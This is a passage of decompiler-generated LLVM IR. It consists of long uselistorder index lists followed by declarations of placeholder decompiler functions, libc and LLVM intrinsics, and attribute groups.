  uselistorder i32 0, { 382, 381, 422, 423, 1371, 386, 385, 424, 1372, 1373, 1374, 1375, 329, 328, 425, 1376, 1377, 181, 1378, 1380, 1381, 132, 133, 1382, 1383, 1379, 74, 75, 76, 77, 2, 1, 3, 0, 170, 169, 171, 172, 173, 1384, 383, 384, 122, 118, 1385, 1386, 175, 176, 174, 177, 1387, 1388, 1389, 1390, 180, 179, 178, 1391, 1392, 1393, 372, 371, 426, 387, 427, 388, 428, 389, 429, 430, 431, 134, 1394, 403, 402, 1395, 1396, 401, 400, 1397, 432, 398, 399, 396, 397, 395, 394, 1398, 393, 392, 391, 390, 343, 1399, 1415, 1400, 184, 1401, 1402, 1403, 1404, 1405, 1406, 186, 1408, 1409, 182, 183, 1410, 1411, 111, 135, 1412, 1413, 632, 78, 79, 373, 374, 185, 1407, 1414, 342, 1416, 433, 434, 1417, 405, 404, 187, 1418, 1419, 188, 1420, 1421, 1422, 90, 435, 436, 1423, 189, 1424, 136, 1425, 1426, 190, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 36, 112, 437, 1437, 191, 1438, 1439, 1440, 4, 1441, 1442, 5, 1443, 1444, 871, 872, 6, 123, 1445, 438, 1446, 785, 786, 787, 788, 789, 793, 790, 791, 792, 7, 344, 80, 794, 439, 795, 796, 797, 406, 407, 873, 874, 8, 440, 730, 441, 1447, 1448, 1449, 9, 10, 137, 138, 139, 1464, 1465, 11, 731, 140, 141, 1362, 1363, 1364, 1365, 192, 193, 1366, 740, 194, 113, 46, 1466, 81, 345, 1470, 1471, 47, 798, 91, 799, 800, 801, 346, 142, 1467, 1468, 1469, 347, 12, 1472, 1473, 1474, 1475, 1476, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1477, 1478, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 37, 1497, 1498, 1499, 1500, 1501, 38, 1502, 1503, 1504, 39, 1505, 1506, 1507, 40, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1532, 1533, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 41, 1551, 1552, 1553, 1554, 1555, 42, 1556, 1557, 1558, 1559, 1560, 43, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 195, 802, 633, 803, 804, 805, 806, 840, 442, 443, 841, 842, 143, 144, 145, 199, 807, 197, 808, 829, 822, 634, 823, 824, 825, 826, 48, 49, 94, 827, 828, 348, 830, 831, 635, 832, 196, 833, 50, 51, 93, 834, 835, 636, 836, 837, 52, 53, 92, 838, 198, 839, 146, 809, 637, 810, 811, 444, 812, 813, 638, 814, 815, 818, 816, 817, 349, 819, 54, 55, 96, 820, 639, 56, 57, 95, 821, 843, 640, 844, 845, 846, 847, 848, 849, 641, 850, 851, 852, 853, 733, 732, 352, 735, 736, 734, 350, 351, 737, 738, 445, 739, 741, 742, 642, 743, 744, 745, 643, 746, 747, 58, 59, 97, 748, 749, 750, 82, 83, 751, 752, 753, 200, 754, 755, 756, 757, 758, 446, 759, 760, 761, 762, 763, 764, 147, 767, 644, 768, 769, 60, 61, 99, 770, 771, 772, 645, 773, 774, 775, 776, 646, 777, 778, 62, 63, 98, 779, 780, 781, 782, 783, 201, 203, 765, 202, 766, 204, 784, 148, 854, 859, 860, 855, 856, 857, 862, 863, 864, 205, 865, 866, 867, 868, 869, 858, 861, 870, 149, 875, 876, 877, 447, 964, 448, 878, 1450, 1451, 1452, 206, 1453, 1121, 1120, 1266, 1267, 1122, 880, 879, 881, 965, 966, 967, 1576, 1577, 1578, 1579, 207, 1580, 1581, 1582, 1268, 1269, 369, 370, 449, 1587, 650, 1588, 450, 1589, 1590, 451, 1591, 1592, 648, 208, 354, 1593, 649, 1594, 452, 84, 1595, 1596, 453, 1611, 1612, 1615, 647, 353, 1616, 408, 151, 150, 1613, 1614, 1583, 1584, 651, 209, 330, 721, 13, 14, 1607, 1001, 884, 1606, 1123, 1124, 119, 211, 1125, 652, 210, 1126, 1127, 1597, 1598, 1599, 1600, 454, 1601, 152, 885, 886, 64, 65, 100, 1270, 1271, 89, 356, 1275, 1272, 1273, 653, 1274, 1276, 654, 1277, 1278, 1279, 1280, 66, 67, 101, 1281, 212, 1282, 1283, 1284, 1286, 1285, 355, 722, 724, 723, 213, 725, 726, 727, 455, 728, 153, 1585, 1586, 154, 457, 458, 1602, 456, 127, 655, 155, 1292, 1293, 1294, 1295, 1296, 214, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 215, 1287, 459, 1288, 1289, 460, 1290, 1291, 1304, 461, 216, 1305, 1306, 1307, 1308, 1309, 156, 218, 217, 219, 221, 220, 222, 226, 225, 224, 223, 1310, 1311, 1335, 1336, 157, 1312, 1313, 230, 228, 229, 1314, 1315, 236, 235, 166, 227, 1316, 1317, 1318, 1319, 1320, 1321, 376, 375, 409, 462, 1322, 1323, 1324, 85, 1325, 232, 231, 233, 234, 165, 1326, 1327, 357, 1328, 1329, 128, 1330, 1331, 1332, 1333, 1334, 15, 16, 887, 888, 86, 17, 410, 463, 1128, 1129, 1104, 1103, 1131, 1130, 1075, 1074, 1133, 1132, 957, 1134, 889, 1136, 1135, 1034, 891, 890, 1367, 1617, 1618, 102, 158, 968, 969, 970, 237, 882, 883, 238, 971, 976, 977, 978, 979, 239, 972, 240, 973, 974, 18, 980, 464, 1137, 1603, 1604, 1605, 892, 1139, 1138, 981, 893, 1000, 894, 895, 896, 1608, 1609, 1610, 975, 19, 1140, 1141, 1142, 1143, 124, 1144, 241, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 242, 656, 659, 657, 658, 1152, 1153, 1154, 1155, 1156, 1157, 20, 1454, 1455, 1456, 125, 1457, 1458, 1459, 1460, 1461, 243, 1462, 660, 663, 661, 662, 1463, 664, 167, 244, 1158, 1159, 120, 367, 1160, 1161, 68, 159, 665, 358, 22, 21, 245, 1162, 246, 666, 23, 359, 247, 248, 249, 69, 250, 465, 897, 982, 983, 984, 1352, 1351, 1353, 1354, 1355, 1356, 44, 251, 1357, 1358, 1359, 252, 114, 115, 466, 420, 421, 1163, 254, 253, 255, 1164, 256, 1165, 1166, 257, 1337, 1338, 467, 258, 259, 260, 1167, 261, 1168, 262, 263, 898, 264, 899, 900, 901, 905, 701, 709, 710, 712, 697, 116, 70, 333, 334, 698, 711, 699, 671, 700, 702, 672, 703, 673, 704, 674, 705, 675, 706, 676, 707, 677, 708, 713, 714, 468, 715, 126, 902, 667, 903, 469, 904, 361, 360, 906, 907, 908, 909, 266, 265, 910, 911, 912, 678, 331, 913, 105, 106, 332, 914, 103, 104, 470, 916, 917, 668, 918, 919, 920, 921, 922, 471, 923, 924, 925, 168, 670, 926, 927, 928, 669, 929, 930, 472, 931, 932, 935, 936, 937, 267, 933, 268, 934, 269, 915, 1105, 1106, 938, 473, 939, 941, 270, 942, 943, 944, 945, 946, 947, 948, 272, 271, 949, 474, 950, 475, 951, 476, 940, 952, 377, 955, 477, 956, 478, 953, 954, 479, 959, 679, 275, 274, 273, 363, 958, 362, 960, 961, 962, 71, 963, 276, 480, 121, 985, 986, 987, 988, 366, 989, 990, 991, 365, 992, 993, 994, 995, 277, 996, 998, 997, 160, 161, 278, 364, 280, 279, 999, 281, 282, 87, 283, 1002, 1003, 129, 130, 88, 1004, 284, 285, 335, 1005, 287, 1006, 288, 286, 481, 1007, 1008, 1010, 1009, 1011, 289, 1012, 1013, 411, 1014, 1015, 1016, 290, 291, 1017, 292, 1018, 293, 1019, 294, 1020, 1021, 117, 1022, 1023, 295, 1024, 1025, 1026, 296, 1028, 297, 336, 1029, 1027, 1030, 1031, 1032, 298, 1033, 1035, 300, 1037, 1038, 299, 1036, 1039, 162, 483, 484, 1040, 1041, 485, 486, 1042, 482, 1043, 1044, 301, 1045, 1046, 302, 303, 1047, 1048, 163, 1049, 1050, 24, 25, 26, 27, 1051, 1052, 304, 413, 1053, 1054, 487, 1055, 488, 1056, 489, 1057, 490, 1058, 491, 1059, 492, 1060, 412, 1061, 493, 1062, 1063, 1064, 305, 1066, 1067, 306, 337, 1068, 1065, 1069, 1070, 1071, 28, 29, 30, 1072, 307, 1073, 1076, 1077, 72, 1078, 308, 1079, 1080, 309, 338, 1082, 1081, 494, 1083, 1085, 1086, 1087, 1088, 495, 1089, 31, 32, 33, 1084, 34, 35, 1090, 310, 1091, 1092, 311, 1095, 1096, 1097, 339, 1098, 1093, 1094, 1100, 1099, 1101, 312, 1102, 1107, 1108, 313, 1110, 1111, 1112, 314, 496, 1114, 1113, 1109, 1116, 1117, 1115, 1118, 315, 1119, 716, 717, 718, 719, 1169, 720, 1170, 1171, 1172, 1173, 316, 317, 497, 1174, 1175, 681, 682, 683, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 689, 1189, 1190, 1191, 1192, 1193, 502, 1194, 1195, 690, 1196, 1197, 1198, 684, 1199, 685, 318, 319, 320, 1200, 1201, 1202, 1203, 691, 1204, 1205, 164, 1206, 1207, 692, 1208, 321, 1209, 1210, 1211, 693, 498, 499, 1212, 1213, 694, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 500, 1228, 1223, 1224, 1225, 1226, 695, 1227, 696, 1229, 501, 1230, 1231, 1232, 1233, 1234, 1235, 686, 1237, 1238, 1239, 1240, 1241, 378, 1242, 1245, 1246, 1243, 1244, 323, 322, 1247, 1248, 1249, 1250, 324, 1251, 1252, 340, 1253, 107, 108, 341, 1254, 109, 110, 503, 1255, 1236, 1256, 631, 680, 687, 688, 1257, 1258, 1259, 1260, 1261, 1262, 414, 1263, 415, 1264, 416, 1265, 379, 1339, 504, 1340, 73, 1341, 131, 1342, 1343, 1344, 380, 1345, 505, 1346, 1347, 1348, 45, 368, 1349, 1350, 1360, 325, 1361, 1368, 326, 1369, 327, 1370, 417, 729, 418, 419, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633 }
  uselistorder i32* @r4, { 104, 954, 955, 956, 957, 958, 976, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 9, 973, 974, 975, 977, 978, 979, 980, 981, 982, 983, 984, 111, 112, 113, 114, 157, 10, 158, 159, 160, 11, 161, 162, 163, 164, 165, 166, 167, 0, 12, 168, 169, 170, 171, 172, 173, 174, 175, 234, 235, 985, 105, 106, 107, 65, 987, 988, 989, 3, 992, 66, 986, 948, 949, 115, 116, 117, 118, 119, 120, 121, 122, 123, 993, 994, 176, 177, 13, 2, 178, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 14, 179, 180, 181, 182, 183, 184, 185, 186, 205, 15, 206, 207, 187, 188, 190, 16, 191, 194, 17, 195, 196, 18, 197, 198, 19, 199, 200, 20, 201, 202, 21, 203, 56, 204, 189, 208, 22, 209, 210, 211, 212, 213, 214, 215, 192, 193, 108, 109, 110, 124, 125, 126, 127, 23, 128, 24, 25, 129, 130, 131, 132, 133, 134, 135, 140, 141, 26, 142, 143, 27, 144, 145, 28, 146, 147, 29, 148, 149, 30, 150, 151, 31, 152, 153, 136, 137, 138, 139, 154, 155, 156, 216, 217, 218, 32, 219, 220, 221, 33, 222, 223, 224, 225, 226, 227, 52, 228, 229, 230, 231, 232, 233, 236, 237, 238, 239, 413, 240, 990, 991, 695, 696, 697, 698, 699, 700, 833, 834, 414, 415, 1011, 1012, 1013, 835, 836, 64, 1016, 53, 1017, 1018, 1019, 1035, 1037, 1038, 1039, 1036, 1020, 1025, 1033, 1034, 1014, 1026, 1027, 1028, 1029, 67, 68, 69, 701, 702, 4, 34, 703, 35, 704, 705, 706, 1021, 1022, 837, 96, 97, 98, 99, 100, 101, 1015, 1023, 1024, 241, 242, 243, 244, 838, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 36, 854, 855, 856, 857, 839, 840, 841, 858, 859, 860, 861, 862, 863, 864, 865, 866, 37, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 898, 899, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 57, 890, 891, 1, 892, 893, 894, 895, 896, 897, 248, 249, 250, 707, 708, 660, 661, 662, 665, 666, 667, 663, 664, 709, 710, 711, 712, 713, 714, 715, 70, 603, 604, 605, 608, 609, 610, 606, 607, 716, 717, 718, 719, 720, 721, 722, 723, 724, 71, 725, 726, 727, 728, 729, 730, 731, 251, 252, 253, 254, 255, 256, 416, 417, 418, 419, 420, 421, 422, 245, 246, 247, 423, 424, 425, 426, 8, 427, 428, 429, 430, 431, 432, 433, 732, 733, 734, 737, 738, 739, 735, 736, 257, 258, 259, 260, 261, 262, 1030, 1031, 1032, 263, 264, 265, 434, 435, 436, 437, 438, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 740, 741, 742, 743, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 300, 301, 302, 303, 94, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 95, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 368, 369, 370, 371, 372, 373, 5, 362, 363, 364, 365, 366, 367, 318, 319, 320, 321, 668, 669, 670, 671, 672, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 393, 394, 395, 396, 397, 398, 399, 400, 387, 388, 389, 390, 391, 392, 102, 401, 402, 403, 404, 55, 406, 405, 54, 407, 408, 409, 410, 411, 6, 412, 439, 38, 7, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 465, 459, 460, 461, 462, 463, 464, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 39, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 40, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 41, 538, 42, 539, 43, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 44, 566, 45, 567, 46, 568, 47, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 48, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 673, 674, 675, 676, 49, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 50, 773, 58, 774, 775, 63, 776, 778, 779, 780, 62, 777, 51, 781, 782, 783, 784, 785, 786, 787, 61, 788, 789, 790, 60, 791, 792, 793, 59, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 938, 935, 936, 937, 939, 940, 941, 942, 943, 944, 945, 946, 947, 950, 951, 952, 103, 953 }
}

declare i32 @__libc_errno(i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
